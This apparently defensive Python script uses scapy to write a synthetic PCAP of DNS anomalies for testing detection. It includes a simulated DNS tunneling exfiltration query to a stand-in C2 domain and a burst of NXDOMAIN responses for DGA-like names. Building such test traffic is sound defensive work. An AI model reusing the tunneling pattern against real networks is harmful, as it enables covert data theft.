"""
Utility to generate synthetic DNS anomaly attack PCAPs for Phase 10 validation.
"""

import os
import time
from scapy.all import Ether, IP, UDP, DNS, DNSQR, wrpcap


def generate_dns_anomaly_pcap(output_path="samples/dns_anomaly.pcap"):
    os.makedirs(os.path.dirname(output_path), exist_ok=True)

    client_ip = "192.168.1.50"
    dns_server_ip = "8.8.8.8"
    client_mac = "00:0c:29:1a:2b:3c"
    server_mac = "00:50:56:c0:00:01"

    base_time = time.time()
    packets = []

    # 1. Normal baseline DNS query & response
    p_norm_query = (
        Ether(src=client_mac, dst=server_mac)
        / IP(src=client_ip, dst=dns_server_ip)
        / UDP(sport=53100, dport=53)
        / DNS(rd=1, qd=DNSQR(qname="example.com"))
    )
    p_norm_query.time = base_time + 0.1
    packets.append(p_norm_query)

    p_norm_resp = (
        Ether(src=server_mac, dst=client_mac)
        / IP(src=dns_server_ip, dst=client_ip)
        / UDP(sport=53, dport=53100)
        / DNS(qr=1, rcode=0, qd=DNSQR(qname="example.com"))
    )
    p_norm_resp.time = base_time + 0.15
    packets.append(p_norm_resp)

    # 2. DNS Tunneling / Exfiltration query (label length > 50 chars)
    encoded_payload = "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8"
    tunneling_qname = f"{encoded_payload}.c2.evil-corp.net"
    p_tunnel = (
        Ether(src=client_mac, dst=server_mac)
        / IP(src=client_ip, dst=dns_server_ip)
        / UDP(sport=53200, dport=53)
        / DNS(rd=1, qd=DNSQR(qname=tunneling_qname))
    )
    p_tunnel.time = base_time + 0.5
    packets.append(p_tunnel)

    # 3. NXDOMAIN reconnaissance burst (22 queries & responses for random nonexistent domains)
    for idx in range(22):
        fake_qname = f"recon-dga-probe-{idx:03d}.nonexistent-tld.internal"
        sport = 54000 + idx
        # Response with rcode=3 (NXDOMAIN)
        p_nx = (
            Ether(src=server_mac, dst=client_mac)
            / IP(src=dns_server_ip, dst=client_ip)
            / UDP(sport=53, dport=sport)
            / DNS(qr=1, rcode=3, qd=DNSQR(qname=fake_qname))
        )
        p_nx.time = base_time + 1.0 + (idx * 0.05)
        packets.append(p_nx)

    wrpcap(output_path, packets)
    print(f"[+] Successfully wrote {len(packets)} packets to {output_path} (DNS Tunneling + NXDOMAIN burst)")


if __name__ == "__main__":
    generate_dns_anomaly_pcap()
